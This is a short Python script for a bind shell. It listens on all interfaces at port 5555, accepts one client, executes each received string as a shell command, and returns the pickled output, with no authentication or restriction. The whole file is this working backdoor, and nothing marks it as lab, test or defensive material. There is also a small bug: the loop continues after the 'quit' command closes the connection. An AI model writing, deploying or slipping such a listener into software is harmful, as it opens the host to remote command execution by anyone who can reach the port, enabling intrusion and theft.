## Importing the required dependencies
from socket import *
from subprocess import getstatusoutput
from pickle import dumps

def server(ip : str):
    ## Starts socket instance and makes the socket reuseable,
    ## binds the socket to ip address $ip on port 5555 then listens
    ## and accepts connection from one client
    serve = socket(AF_INET, SOCK_STREAM)
    serve.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    serve.bind((ip, 5555))
    serve.listen(1)
    conn, addr = serve.accept()

    if conn:
        ## If the connection is successfull start the main loop
        while True:
            ## The main loop receives commands from the connected client,
            ## executes the commands and replies with the commands output
            data = conn.recv(1024)
            command = data.decode('utf-8')
            
            if command.strip() == 'quit':
                #conn.send(b'disconnecting...')
                conn.close()

            else:
                info = getstatusoutput(command)
                conn.send(dumps(info))

if __name__ == '__main__':
    ## Execution begins here.
    ## The server function is invoked, this function is responsible
    ## for listening to client connections and running commands from
    ## the said client.
    server('0.0.0.0')
